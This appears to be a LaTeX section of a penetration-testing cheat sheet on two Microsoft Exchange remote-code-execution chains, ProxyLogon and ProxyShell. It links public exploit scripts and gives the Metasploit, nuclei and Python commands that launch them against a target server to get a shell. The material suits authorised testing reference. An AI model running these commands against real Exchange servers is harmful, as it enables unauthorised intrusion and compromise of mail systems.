\subsection{CVE}
\subsubsection{RCE (Proxylogon)}
ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin.

We have also chained this bug with another post-auth arbitrary-file-write vulnerability, CVE-2021-27065, to get code execution.

metasploit (\verb+scanner/http/exchange_proxylogon+)
\begin{verbatim}
set RHOSTS <ip>
\end{verbatim}

\href{https://github.com/hakivvi/proxylogon}{proxylogon.py}:
\begin{verbatim}
python3 proxylogon.py http://mail.corp.com email@corp.com
\end{verbatim}

\subsubsection{RCE (ProxyShell)}
CVE-2021-34473 Microsoft Exchange Server Remote Code Execution Vulnerability. This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL

\href{https://github.com/kh4sh3i/ProxyShell}{ProxyShell}

recon:
\begin{verbatim}
nuclei -u target.com -t proxyshell.yaml
\end{verbatim}

shell:
\begin{verbatim}
sudo python3 ProxyShell.py -u https://<IP>
\end{verbatim}


